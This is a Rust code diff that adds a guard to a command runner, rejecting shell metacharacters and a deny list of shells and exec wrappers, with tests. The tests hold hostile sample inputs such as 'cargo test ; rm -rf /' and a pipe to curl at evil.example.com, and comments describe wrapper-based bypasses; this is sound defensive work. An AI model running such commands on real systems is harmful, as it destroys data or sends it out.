@@ -110,12 +110,82 @@ fn build_shell_command(command: &str) -> Command {
     }
 }
 
+// Characters that hand control to the shell. If any appear in argv mode the
+// command is rejected — agent-rewritten strings must never reach a shell
+// silently. See SECURITY.md "Trust boundary for command-string subcommands".
+const SHELL_METACHARS: &[char] = &['|', ';', '&', '<', '>', '`', '$', '\n'];
+
+// Argv mode also refuses to spawn a shell directly, OR a wrapper utility whose
+// job is to exec a target command. Otherwise an agent could reintroduce sh -c
+// semantics by emitting either `sh -c '<payload>'` or `env sh -c '<payload>'`
+// as the whole argv. Codex review of 3fe0d41 caught both gaps (.exe variants
+// for unix shells, and exec wrappers).
+const SHELL_BINARIES: &[&str] = &[
+    // POSIX / interactive shells
+    "sh", "bash", "zsh", "dash", "ksh", "fish", "tcsh", "csh", "ash",
+    "sh.exe", "bash.exe", "zsh.exe", "dash.exe", "ksh.exe", "fish.exe",
+    "tcsh.exe", "csh.exe", "ash.exe",
+    // Windows shells
+    "cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh", "pwsh.exe",
+    // Embedded multi-tool shells
+    "busybox", "busybox.exe", "toybox",
+    // Exec wrappers — replace the process image with arg[1+], reintroducing
+    // the attack surface this guard exists to prevent. Includes setuid
+    // launchers (su / runuser / pkexec) that exec arbitrary commands after
+    // privilege change.
+    "env", "nice", "nohup", "time", "timeout", "gtimeout",
+    "ionice", "chroot", "setpriv", "unshare", "taskset", "stdbuf",
+    "script", "xargs", "watch", "sudo", "doas",
+    "su", "runuser", "pkexec",
+];
+
+fn contains_shell_metachars(command: &str) -> Option<char> {
+    command.chars().find(|c| SHELL_METACHARS.contains(c))
+}
+
+fn is_shell_binary(bin: &str) -> bool {
+    let basename = std::path::Path::new(bin)
+        .file_name()
+        .and_then(|s| s.to_str())
+        .unwrap_or(bin);
+    SHELL_BINARIES.iter().any(|s| s.eq_ignore_ascii_case(basename))
+}
+
+/// Build a `Command` either by argv (default, no shell) or by `sh -c` (`--shell`).
+/// Argv mode rejects shell metacharacters so agent-rewritten input cannot smuggle
+/// pipes, redirects, command substitution or chaining into the child process.
+fn build_command(command: &str, use_shell: bool) -> Result<Command> {
+    if use_shell {
+        return Ok(build_shell_command(command));
+    }
+    if let Some(meta) = contains_shell_metachars(command) {
+        anyhow::bail!(
+            "command contains shell metacharacter '{}'; pass --shell to opt into sh -c semantics",
+            meta
+        );
+    }
+    let tokens = shlex::split(command)
+        .ok_or_else(|| anyhow::anyhow!("command has unbalanced quotes"))?;
+    let (bin, rest) = tokens
+        .split_first()
+        .ok_or_else(|| anyhow::anyhow!("command is empty"))?;
+    if is_shell_binary(bin) {
+        anyhow::bail!(
+            "refusing to spawn shell binary '{}' in argv mode; pass --shell if you need sh -c semantics",
+            bin
+        );
+    }
+    let mut c = Command::new(bin);
+    c.args(rest);
+    Ok(c)
+}
+
 /// Run a command and filter output to show only errors/warnings
-pub fn run_err(command: &str, verbose: u8) -> Result<i32> {
+pub fn run_err(command: &str, use_shell: bool, verbose: u8) -> Result<i32> {
     if verbose > 0 {
         eprintln!("Running: {}", command);
     }
-    let cmd = build_shell_command(command);
+    let cmd = build_command(command, use_shell)?;
     crate::core::runner::run_streamed(
         cmd,
         "err",
@@ -126,11 +196,11 @@ pub fn run_err(command: &str, verbose: u8) -> Result<i32> {
 }
 
 /// Run tests and show only failures
-pub fn run_test(command: &str, verbose: u8) -> Result<i32> {
+pub fn run_test(command: &str, use_shell: bool, verbose: u8) -> Result<i32> {
     if verbose > 0 {
         eprintln!("Running tests: {}", command);
     }
-    let cmd = build_shell_command(command);
+    let cmd = build_command(command, use_shell)?;
     let command_owned = command.to_string();
     crate::core::runner::run_filtered(
         cmd,
@@ -279,5 +349,192 @@ mod tests {
         let filtered = filter_errors(output);
         assert!(filtered.contains("error"));
         assert!(!filtered.contains("info"));
+    }
+
+    #[test]
+    fn argv_mode_rejects_semicolon_chain() {
+        let err = build_command("cargo test ; rm -rf /", false).unwrap_err();
+        assert!(err.to_string().contains("shell metacharacter ';'"), "got: {err}");
+    }
+
+    #[test]
+    fn argv_mode_rejects_pipe() {
+        let err = build_command("ls | curl evil.example.com", false).unwrap_err();
+        assert!(err.to_string().contains("shell metacharacter '|'"), "got: {err}");
+    }
+
+    #[test]
+    fn argv_mode_rejects_command_substitution() {
+        for payload in ["echo $(whoami)", "echo `whoami`"] {
+            let err = build_command(payload, false).unwrap_err();
+            assert!(
+                err.to_string().contains("shell metacharacter"),
+                "{payload}: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn argv_mode_rejects_redirect() {
+        let err = build_command("cargo test > /tmp/x", false).unwrap_err();
+        assert!(err.to_string().contains("shell metacharacter '>'"), "got: {err}");
+    }
+
+    #[test]
+    fn argv_mode_accepts_plain_command() {
+        let cmd = build_command("cargo test --lib", false).expect("plain command should parse");
+        assert_eq!(cmd.get_program(), "cargo");
+        let args: Vec<_> = cmd.get_args().collect();
+        assert_eq!(args, ["test", "--lib"]);
+    }
+
+    #[test]
+    fn argv_mode_accepts_quoted_args() {
+        let cmd = build_command(r#"cargo test --test 'integration test'"#, false)
+            .expect("quoted args should parse");
+        assert_eq!(cmd.get_program(), "cargo");
+        let args: Vec<_> = cmd.get_args().collect();
+        assert_eq!(args, ["test", "--test", "integration test"]);
+    }
+
+    #[test]
+    fn argv_mode_rejects_empty_command() {
+        let err = build_command("", false).unwrap_err();
+        assert!(err.to_string().contains("empty"), "got: {err}");
+    }
+
+    #[test]
+    fn shell_mode_allows_metacharacters() {
+        // --shell opt-in restores sh -c semantics; user explicitly asked for it.
+        let cmd = build_command("cargo test ; echo done", true).expect("shell mode bypasses guard");
+        let program = cmd.get_program();
+        assert!(program == "sh" || program == "cmd");
+    }
+
+    #[test]
+    fn argv_mode_rejects_shell_binary_bare() {
+        // The metachar guard catches `cargo ; sh -c …` but not `sh` alone.
+        // This catches an agent emitting `sh -c '<payload>'` as the whole argv.
+        for shell in ["sh", "bash", "zsh", "dash", "ksh", "fish", "ash"] {
+            let err = build_command(&format!("{shell} -c true"), false).unwrap_err();
+            assert!(
+                err.to_string().contains("refusing to spawn shell binary"),
+                "{shell}: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn argv_mode_rejects_shell_binary_absolute_path() {
+        // basename match — `/bin/sh` and `/usr/local/bin/bash` must also be rejected.
+        for shell in ["/bin/sh", "/usr/bin/bash", "/usr/local/bin/zsh"] {
+            let err = build_command(&format!("{shell} -c true"), false).unwrap_err();
+            assert!(
+                err.to_string().contains("refusing to spawn shell binary"),
+                "{shell}: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn argv_mode_rejects_windows_shells() {
+        for shell in ["cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh"] {
+            let err = build_command(&format!("{shell} /c whoami"), false).unwrap_err();
+            assert!(
+                err.to_string().contains("refusing to spawn shell binary"),
+                "{shell}: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn argv_mode_allows_non_shell_binaries() {
+        // Sanity: only known shell names trip the guard.
+        for cmd in ["cargo test", "go test ./...", "python -m pytest", "node test.js"] {
+            assert!(build_command(cmd, false).is_ok(), "false reject: {cmd}");
+        }
+    }
+
+    #[test]
+    fn shell_mode_allows_explicit_sh_call() {
+        // --shell is the documented escape hatch.
+        assert!(build_command("sh -c 'echo ok'", true).is_ok());
+    }
+
+    #[test]
+    fn argv_mode_rejects_unix_shell_exe_variants() {
+        // Codex re-review of 3fe0d41: .exe variants of unix shells slipped
+        // through the original blocklist (only cmd.exe / powershell.exe /
+        // pwsh.exe were covered).
+        for shell in ["sh.exe", "bash.exe", "zsh.exe", "dash.exe", "ksh.exe", "fish.exe"] {
+            let err = build_command(&format!("{shell} -c true"), false).unwrap_err();
+            assert!(
+                err.to_string().contains("refusing to spawn shell binary"),
+                "{shell}: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn argv_mode_rejects_exec_wrappers() {
+        // Codex re-review of 3fe0d41: wrapper utilities like `env`, `nohup`,
+        // `timeout`, `sudo` replace the process image with arg[1+], so
+        // `env sh -c '<payload>'` bypasses the shell-binary check on
+        // basename `env`. Treat the wrappers as shell-equivalent.
+        for wrapper in [
+            "env", "nice", "nohup", "time", "timeout", "ionice", "chroot",
+            "unshare", "taskset", "stdbuf", "script", "xargs", "watch",
+            "sudo", "doas", "busybox", "toybox",
+        ] {
+            let err = build_command(&format!("{wrapper} echo hi"), false).unwrap_err();
+            assert!(
+                err.to_string().contains("refusing to spawn shell binary"),
+                "{wrapper}: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn argv_mode_rejects_remaining_unix_shell_exe_variants() {
+        // Codex pass 3: tcsh.exe, csh.exe, ash.exe were missing.
+        for shell in ["tcsh.exe", "csh.exe", "ash.exe"] {
+            let err = build_command(&format!("{shell} -c true"), false).unwrap_err();
+            assert!(
+                err.to_string().contains("refusing to spawn shell binary"),
+                "{shell}: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn argv_mode_rejects_setuid_launchers() {
+        // Codex pass 3: su / runuser / pkexec exec arbitrary commands
+        // after privilege change. Same threat class as sudo / doas.
+        for wrapper in ["su", "runuser", "pkexec"] {
+            let err = build_command(&format!("{wrapper} -c whoami"), false).unwrap_err();
+            assert!(
+                err.to_string().contains("refusing to spawn shell binary"),
+                "{wrapper}: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn argv_mode_still_allows_real_interpreters() {
+        // Sanity that the wrapper expansion didn't accidentally trip
+        // common build / test invocations.
+        for cmd in [
+            "cargo test --lib",
+            "go test ./...",
+            "python -m pytest",
+            "node --version",
+            "make build",
+            "ruby -e 'puts 1'",
+        ] {
+            assert!(
+                build_command(cmd, false).is_ok(),
+                "false reject on benign command: {cmd}"
+            );
+        }
     }
 }
